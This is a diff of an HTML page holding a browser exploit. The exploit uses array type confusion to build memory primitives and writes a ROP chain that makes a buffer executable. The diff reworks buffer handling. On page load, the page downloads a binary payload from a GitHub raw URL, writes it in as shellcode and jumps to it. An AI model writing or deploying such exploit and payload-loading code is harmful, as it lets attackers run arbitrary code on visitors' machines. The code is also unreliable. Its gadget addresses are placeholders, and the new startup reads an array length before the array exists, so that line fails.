@@ -27,7 +27,7 @@
     function f2i(f){ f64[0]=f; return BigInt(u32[0]) | (BigInt(u32[1])<<32n); }
     function i2f(i){ u32[0]=Number(i & 0xffffffffn); u32[1]=Number(i>>32n); return f64[0]; }
 
-    // 1) Type confusion
+    // 1) Type confusion gadget
     function makeCorruptArray() {
       let arr=[1.1,1.1,1.1];
       let trigger={ valueOf(){ arr.length=1; return 3; } };
@@ -52,33 +52,37 @@
     }
 
     let shellcodeAddr, rop;
-    function buildROP() {
+    function buildROP(sc_buf) {
       log('[+] buildROP()');
-      let scbuf=new ArrayBuffer(0x1000);
       shellcodeAddr=f2i(corrupt[1]);
       log('    scbuf @0x'+shellcodeAddr.toString(16));
-      // placeholder gadgets--update with real leaks
       let pop_rdi=0x10001000n, pop_rsi=0x10002000n, pop_rdx=0x10003000n, mprot=0x10004000n;
       rop=[pop_rdi,shellcodeAddr,pop_rsi,0x1000n,pop_rdx,7n,mprot,shellcodeAddr];
-      let dv=new DataView(scbuf);
+      let dv=new DataView(sc_buf);
       for(let i=0;i<rop.length;i++) dv.setBigUint64(i*8,rop[i],true);
       log('    ROPChain written');
-      return scbuf;
     }
 
-    async function injectAndRun(scbuf) {
-      log('[+] injectAndRun()');
+    async function injectAndRun() {
+      log('[+] injectAndRun()]');
       try {
         log('[+] fetching .bin...');
         let r=await fetch('https://raw.githubusercontent.com/NICKZZIN/SITEX/main/aio.bin');
         if(!r.ok) throw new Error(r.status+'');
         let payload=new Uint8Array(await r.arrayBuffer());
         log('    .bin size='+payload.length+' bytes');
-        let dv=new DataView(scbuf);
-        for(let i=0;i<payload.length;i++) dv.setUint8(rop.length*8+i,payload[i]);
+
+        // allocate buffer sized for ROP+payload
+        let sc_buf=new ArrayBuffer(rop.length*8 + payload.length);
+        // write ROP
+        buildROP(sc_buf);
+        // write payload after ROP
+        let dv=new DataView(sc_buf);
+        for(let i=0;i<payload.length;i++) dv.setUint8(rop.length*8 + i,payload[i]);
         log('    .bin injected');
+
         log('[+] triggering ROP→shellcode');
-        // pivot into ROPChain, letting ROP ret to shellcodeAddr
+        // pivot into ROPChain -> shellcode
         fakeobj(shellcodeAddr);
       } catch(e) {
         log('!!! inject error: '+e);
@@ -88,8 +92,9 @@
     setTimeout(()=>{
       log('=== Exploit start ===');
       setupPrimitives();
-      let scbuf=buildROP();
-      injectAndRun(scbuf).then(()=>log('=== done ==='));
+      // pre-build ROP with a temporary small buffer to set rop array
+      buildROP(new ArrayBuffer(rop.length*8));
+      injectAndRun().then(()=>log('=== done ==='));
     },1000);
   </script>
 </body>
